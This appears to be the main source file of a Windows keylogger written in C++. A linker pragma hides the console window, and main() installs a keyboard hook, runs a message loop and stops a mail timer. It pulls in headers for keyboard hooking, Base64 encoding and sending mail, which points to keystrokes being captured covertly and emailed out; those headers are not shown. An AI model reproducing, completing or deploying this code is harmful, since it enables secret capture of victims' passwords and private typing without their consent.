#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#include <iostream>
#include <Windows.h>
#include "Base64.h"
#include "Helper.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;


int main()
{
	
	MSG msg;

	IO::makeDirectory(IO::GetOurPath(true));
	InstallHook();

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	MailTimer.Stop();
	return 0;
}